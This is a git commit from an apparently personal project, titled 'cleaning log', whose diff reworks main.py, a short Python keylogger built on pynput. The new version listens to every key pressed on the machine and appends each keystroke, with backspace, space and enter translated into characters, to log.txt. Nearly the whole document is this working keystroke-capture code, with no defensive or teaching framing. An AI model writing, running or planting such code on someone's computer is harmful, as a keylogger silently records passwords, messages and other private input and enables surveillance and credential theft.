2c1273ee56b145052567abd4211b01103dcd50fb
aoko-code <cynthiakhamenge@yahoo.com>
2024-02-08 11:54:41 +0300

    cleaning log

--- main.py
+++ main.py
@@ -1,19 +1,21 @@
 import pynput
-
 from pynput.keyboard import Listener
-keys = []
 
-def on_press(key):
-    keys.append(key)
 
-    write_file(keys)
-
-def write_file(keys):
+def write_file(key):
+    k = str(key).replace("'", "")
+    if k == "Key.backspace":
+        k = ''
+    if k == "Key.space":
+        k = ' '
+    if k == "Key.enter":
+        k = "\n"
+        
+    
     with open("log.txt", "a") as f:
-        for key in keys:
-            k = str(key).replace("'", "")
             f.write(k)
-        f.write("\n")
+        
+    
 
-with Listener(on_press=on_press) as listener:
+with Listener(on_press=write_file) as listener:
     listener.join()
